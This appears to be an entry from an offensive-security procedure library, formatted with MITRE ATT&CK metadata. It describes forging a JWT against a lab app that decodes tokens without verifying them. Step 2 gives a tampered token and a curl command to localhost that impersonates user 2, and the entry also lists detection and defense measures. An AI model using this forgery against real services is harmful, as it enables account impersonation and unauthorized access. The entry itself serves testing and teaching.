---
tags:
  - jwt-forgery
  - impersonation
  - bypass
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/jwt.io]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-forged-jwt-token-jti2]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:19.038Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7ad87c8b-cf10-45f1-9ca8-e4e4f7726f63
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Forge-JWT-Token-for-User-Impersonation

## Summary

This procedure exploits the lack of JWT signature verification by modifying the token payload to impersonate a different user (e.g., changing jti from 1 to 2) while reusing the invalid signature, gaining unauthorized access.

## Description

The vulnerability stems from src/index.js line 13 using jwt.decode(token) without jwt.verify, allowing payload tampering. By altering the base64-encoded payload section of the JWT (e.g., to {"jti":2}) and keeping the same signature, the app treats it as valid for the new user_id, enabling identity forgery and potential unauthorized actions.

## Requirements

1. Successful base token test from prior procedure
2. jwt.io access for payload modification
3. Running app with test DB data for jti=2

## Defense

Defensive measures and detection strategies:

- Mandate signature verification and secret rotation
- Cross-validate token claims with database records
- Implement JWT introspection endpoints
- Detect payload anomalies via logging and SIEM

## Objectives

1. Forge token to impersonate user
2. Bypass auth to access as altered identity
3. Demonstrate full impact of unverified decode

## Instructions

### Step 1: Modify Token Payload

**Context**: Alter the JWT payload to change jti without updating signature.

No command; on [[tools/jwt.io]], edit payload to {"jti":2}, resulting in 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc' (same signature).

### Step 2: Send Forged Request

**Context**: Test impersonation by sending the tampered token.

**Command** ([[commands/curl-send-forged-jwt-token-jti2]]):
```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

> App decodes new payload, logs 'logged in as: 2' despite invalid signature.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-send-forged-jwt-token-jti2]]

## Tools Used

- [[tools/curl]]
- [[tools/jwt.io]]

## Tags

- jwt-forgery
- impersonation
- bypass
